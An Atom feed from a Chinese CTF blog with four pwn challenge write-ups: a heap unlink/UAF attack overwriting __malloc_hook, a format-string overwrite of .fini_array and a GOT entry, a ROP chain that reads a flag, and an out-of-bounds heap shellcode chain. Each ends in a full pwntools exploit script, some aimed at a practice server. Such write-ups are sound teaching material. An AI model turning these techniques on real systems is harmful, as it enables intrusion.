<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://czh11.github.io</id>
    <title>Nono</title>
    <updated>2020-12-01T15:09:15.279Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://czh11.github.io"/>
    <link rel="self" href="https://czh11.github.io/atom.xml"/>
    <subtitle>明天会更好</subtitle>
    <logo>https://czh11.github.io/images/avatar.png</logo>
    <icon>https://czh11.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Nono</rights>
    <entry>
        <title type="html"><![CDATA[unlink加UAF堆溢出]]></title>
        <id>https://czh11.github.io/post/unlink-jia-dui-yi-chu/</id>
        <link href="https://czh11.github.io/post/unlink-jia-dui-yi-chu/">
        </link>
        <updated>2020-12-01T12:36:37.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- Noleak<br>
假设地址ptr指向的P<br>
对于64位的：<br>
FD-&gt;ptr-0x8<em>3<br>
BK-&gt;prt-0x8</em>2<br>
FD-&gt;bk=FD+0x18=ptr-0x18+0x18=ptr<br>
BK-&gt;fd=BK+0x10=ptr-0x10+0x10=ptr<br>
FD-&gt;bk=BK<br>
BK-&gt;fd=PD(p=ptr-0x18)<br>
最终的结果为p=ptr-0x18<br>
对于32位的：<br>
FD-&gt;ptr-0x4<em>3<br>
BK-&gt;prt-0x4</em>2<br>
FD-&gt;bk=FD+0xc=ptr-0xc+0xc=ptr<br>
BK-&gt;fd=BK+0x8=ptr-0x8+0x8=ptr<br>
FD-&gt;bk=BK<br>
BK-&gt;fd=PD(p=ptr-0xc)<br>
最终的结果为p=ptr-0xc<br>
查看一下保护</p>
<p>开了FULL RELRO，不能修改got表</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec timu
[*] '/home/giantbranch/Desktop/timu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<p>看一下代码</p>
<pre><code>int sub_400917()
{
  void *v0; // rax
  unsigned int nbytes; // ST0C_4
  int v3; // [rsp+8h] [rbp-8h]

  sub_40072C(&quot;Index: &quot;, 7u);
  LODWORD(v0) = sub_4007B8();
  v3 = (signed int)v0;
  if ( (unsigned int)v0 &lt;= 9 )
  {
    v0 = buf[(unsigned int)v0];
    if ( v0 )
    {
      sub_40072C(&quot;Size: &quot;, 6u);
      nbytes = sub_4007B8();
      sub_40072C(&quot;Data: &quot;, 6u);
      LODWORD(v0) = read(0, buf[v3], nbytes);
    }
  }
  return (signed int)v0;
}
</code></pre>
<p>发现在修改内容的时候没有判断Size的大小，可以造成堆溢出，、</p>
<pre><code>void sub_4008D7()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  sub_40072C(&quot;Index: &quot;, 7u);
  v0 = sub_4007B8();
  if ( v0 &lt;= 9 )
    free(buf[v0]);
}
</code></pre>
<p>有个UAF</p>
<p>这题可以覆盖__malloc_hook为shellcode的地址，来拿到flag</p>
<p>先申请两个堆，堆的情况为</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000a61	0x0000000000000000
gdb-peda$ 
0x1ea8020:	0x0000000000000000	0x0000000000000000
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000000	0x00000000000000a1
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1

</code></pre>
<p>第二步，开始构造fake chunk0，通过unlink来修改buf数组指向bss段，而我们将shellcode写入bss段，在通过修改__malloc_hook的地址为shellcode的地址，这里得到bss = 0x601020，buf = 0x601040。可以构造payload=p64(0)+p64(0x91)+p64(buf-0x18)+p64(buf-0x10)+p64(0)*14+p64(0x90)+p64(0xa0),</p>
<p>此时堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000000091
gdb-peda$ 
0x1ea8020:	0x0000000000601028	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>可以看到已经伪造了一个假的堆，然后我们释放chunk1，chunk1会向前合并fake chunk0然后并入top chunk中</p>
<p>堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000020ff1
gdb-peda$ 
0x1ea8020:	0x0000000000601028	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>可以看到已经并入top chunk中了，然后在看一下buf数组的情况：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601028	0x0000000001ea80b0
0x601050:	0x0000000000000000	0x0000000000000000

</code></pre>
<p>可以看到buf[0]指向的地址已经变为0x0000000000601028，这时我们修改chunk0实际是修改的bss段的数据</p>
<p>可以修改让buf[0]指向bss段的首地址，同时，也伪造了一个fake chunk1，让buf[1]指向buf数组的首地址：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601020	0x0000000000601040
0x601050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601060:	0x0000000000000000	0x0000000000000020
0x601070:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>下一步就是如何让buf数组中的一个指向__malloc_hook，这里再申请两个堆，这里的chunk2就是我们伪造fake chunk0，堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000000111
gdb-peda$ 
0x1ea8020:	0x0000000000600a63	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000111
0x1ea8130:	0x0000000000000a64	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>这里先删除chunk2，chunk2就会进入unsorted bin：</p>
<pre><code>db-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x1ea8010 —▸ 0x7f7df0843b78 (main_arena+88) ◂— adc    byte ptr [rax + 0x1ea], al /* 0x1ea8010 */
smallbins
empty
largebins
empty
</code></pre>
<p>然后修改chunk2，让fake chunk1也进入unsorted bin</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1ea8010 ◂— 0x0
BK: 0x1ea8010 —▸ 0x601060 ◂— 0
smallbins
empty
largebins
empty

</code></pre>
<p>这里在申请一个和chunk2相同大小的chunk4，然后留在unsortedbin就只有fake chunk1，</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1ea8010 ◂— 0xa65 /* 'e\n' */
BK: 0x601060 ◂— 0
smallbins
empty
largebins
empty
</code></pre>
<p>这时buf数组的情况：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601020	0x0000000000601040
0x601050:	0x0000000001ea8020	0x0000000001ea8130
gdb-peda$ 
0x601060:	0x0000000001ea8020	0x0000000000000020
0x601070:	0x00007f7df0843b78	0x0000000000000000
</code></pre>
<p>可以看到buf[6]已经为main_arena+88的地址了，这里我们可以通过修改chunk1来修改0x601040~0x601070的数据，这样我们就可以让buf[6]指向的地址变为__malloc_hook的地址。然后在修改__malloc_hook的地址处的数据的为shellcode的地址，这样在malloc的时候会触发shellcode。然后同修改chunk0在bss段来布置shellcode。</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x6e69622fb848686a	0xe7894850732f2f2f
0x601030:	0x2434810101697268	0x6a56f63101010101
gdb-peda$ 
0x601040:	0x894856e601485e08	0x050f583b6ad231e6
0x601050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x00007f7df0843b10	0x0000000000000000
gdb-peda$ 
0x601080:	0x0000000000000000	0x0000000000000000
0x601090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x6010a0:	0x0000000000000000	0x0000000000000000
0x6010b0:	0x0000000000000000	0x0000000000000000

</code></pre>
<pre><code>0x7f7df0843b10 &lt;__malloc_hook&gt;:	0x0000000000601020	0x0000000000000000
0x7f7df0843b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000
</code></pre>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *

def add(size, content):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('1')
	print r.recvuntil(&quot;Size: &quot;)
	r.sendline(size)
	print r.recvuntil(&quot;Data: &quot;)
	r.send(content)

def delete(index):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('2')
	print r.recvuntil(&quot;Index: &quot;)
	r.sendline(index)

def edit(index, size, content):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('3')
	print r.recvuntil(&quot;Index: &quot;)
	r.sendline(index)
	print r.recvuntil(&quot;Size: &quot;)
	r.sendline(size)
	print r.recvuntil(&quot;Data: &quot;)
	r.send(content)


#r = remote(&quot;220.249.52.133&quot;, 58646)
r=process(&quot;./timu&quot;)
context(arch = &quot;amd64&quot;, os = 'linux')
elf = ELF(&quot;./timu&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)
malloc_hook = libc.symbols['__malloc_hook']
bss = 0x601020
buf = 0x601040
gdb.attach(r)

#	chunk 0 
add(str(0x90), 'a\n')
#	chunk 1
add(str(0x90), 'b\n')
#	fade chunk0
#	      pre_size,    size
payload = p64(0) + p64(0x91) 
#	      fd,                   bk  
payload += p64(buf - 0x18) + p64(buf - 0x10)  
payload += p64(0) * 14
#	change chunk size of 1
payload += p64(0x90) + p64(0xa0)  

edit('0', str(len(payload)), payload)
delete('1')
payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
#	change buf[0] pointer to bss, buf[1] to buf
edit('0', str(len(payload)), payload) 

#	chunk 2
add(str(0x100), 'c\n')
#	chunk 3
add(str(0x100), 'd\n')

delete('2')
payload = p64(0) + p64(buf + 0x8 * 4)
edit('2', str(len(payload)), payload)

#	chunk 4, addr is the same with chunk2
add(str(0x100), 'e\n')

payload = p64(bss) + p64(buf) + p64(0) * 4 + '\x10'
edit('1', str(len(payload)), payload)

shellcode = asm(shellcraft.sh())
edit('0', str(len(shellcode)), shellcode)
#	change malloc hook
edit('6', '8', p64(bss))

print r.recvuntil(&quot;Your choice :&quot;)
r.sendline('1')
print r.recvuntil(&quot;Size: &quot;)
r.sendline('1')

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用格式化字符串漏洞覆盖.fini_array函数]]></title>
        <id>https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/</id>
        <link href="https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/">
        </link>
        <updated>2020-12-01T04:35:46.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- greeting-150</p>
<p>检查一下保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec greeting-150
[*] '/home/giantbranch/Desktop/greeting-150'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>看一下函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf(&quot;Please tell me your name... &quot;);
  if ( !getnline(&amp;v5, 64) )
    return puts(&quot;Don't ignore me ;( &quot;);
  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);
  return printf(&amp;s);
}
</code></pre>
<pre><code>size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
</code></pre>
<p>发现有个格式化字符串漏洞，但是没有循环，</p>
<pre><code>关于.init_array 和.fini_array，也就是构造函数与析构函数

大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。
</code></pre>
<p>因此这题可以利用格式化字符串漏洞覆盖.fini_array函数，重新执行main函数，同时可以利用格式化字符串漏洞覆盖strlen函数的got表，让其执行system函数。</p>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *
#r=process(&quot;./greeting-150&quot;)
r=remote(&quot;220.249.52.133&quot;,39180)
context.log_level='debug'
r.recvuntil(&quot;Please tell me your name... &quot;)
fini_got=0x08049934
main=0x080485ED
system=0x08048490
strelen=0x8049A54
payload='aa'+p32(strelen+2)+p32(strelen)+p32(fini_got)+'%'+str(0x804-32)+'c%12$hn'
payload+='%'+str(0x8490-0x804)+'c%13$hn'
payload+='%'+str(0x85ED-0x8490)+'c%14$hn'
r.sendline(payload)
r.recvuntil(&quot;Please tell me your name... &quot;)
r.sendline('/bin/sh')
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[pwntools中判断输入是否结束]]></title>
        <id>https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/</id>
        <link href="https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/">
        </link>
        <updated>2020-11-28T06:36:16.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界-Recho</p>
<p>这题很容易发现是栈溢出，但是如何从while循环中退出来，困扰了很长时间，看来wp才发现pwntools中有一个io.shutdown('send')，帮助输入结束，然后就查看了一下字符串，发现有个flag，接下来就是如何从中读取出flag了，这里用open打开，用read读出，用printf打印出来，open的系统调用号是2，而且alarm是系统调用的函数，通过gdb调试找到syscall的偏移，然后就是构造payload了。</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1606545634031.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1606545642873.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*-coding:utf-8 -*
from pwn import *
context.log_level='debug'
r=process(&quot;./Recho&quot;)
r=remote(&quot;220.249.52.133&quot;,38037)
elf=ELF(&quot;./Recho&quot;)
write_plt=elf.plt['write']
read_plt=elf.plt['read']
alarm_plt=elf.plt['alarm']
alarm_got=elf.got['alarm']
printf_plt=elf.plt['printf']
pop_rdi=0x00000000004008a3
pop_rsi=0x00000000004008a1
pop_rdx=0x00000000004006fe
pop_rax=0x00000000004006fc
add_rdi_al=0x000000000040070d
flag=0x0601058
bss=0x0601090
payload='a'*0x38
payload+=p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(0x5)+p64(add_rdi_al)
payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(0x2)+p64(alarm_plt)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x500)+p64(0)+p64(pop_rdx)+p64(0x50)+p64(read_plt)
payload+=p64(pop_rdi)+p64(bss+0x500)+p64(printf_plt)
r.recvuntil(&quot;Welcome to Recho server!&quot;)
r.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
r.sendline(payload)
r.recv()
r.shutdown('send')
r.interactive()
r.close
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ctfpwn 一道数组越界的堆题]]></title>
        <id>https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/</id>
        <link href="https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/">
        </link>
        <updated>2020-11-19T13:44:23.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p><img src="https://czh11.github.io/post-images/1605793554457.png" alt="" loading="lazy"><br>
没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
<img src="https://czh11.github.io/post-images/1605793729793.jpg" alt="" loading="lazy"><br>
没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://czh11.github.io/post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
p=process(&quot;./note-service2&quot;)
#p=remote(&quot;220.249.52.133&quot;,42490)
elf=ELF(&quot;./note-service2&quot;)
print(hex(elf.got['free']))
context.log_level='debug'
context.arch='amd64'
def add(index,content):
    p.recvuntil('your choice&gt;&gt;')
    p.sendline('1')
    p.recvuntil('index')
    p.sendline(str(index))
    p.recvuntil('size')
    p.sendline(str(8))    
    p.recvuntil('content')
    p.send(content)

def delete(index):
	p.recvuntil('your choice&gt;&gt;')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(index))

&quot;&quot;&quot;
;64位系统调用
mov rdi,xxxx;&quot;/bin/sh&quot;的地址
mov rax,0x3b;execve系统调用号
mov rsi,0
mov rdx,0
sycall
&quot;&quot;&quot;
gdb.attach(p)
add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
#把got表中free函数的指针覆盖为第二个chunk的指针
#然后在第二个chunk中写入
#xor rsi,rsi
#nop
#nop
#jmp 0x19
add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
#push 0x3b
#pop rax
#nop
#nop
#jmp 0x19
add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
#
add(3,asm('syscall')+'\x90'*5)

delete(0)
#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。

p.interactive()
</code></pre>
]]></content>
    </entry>
</feed>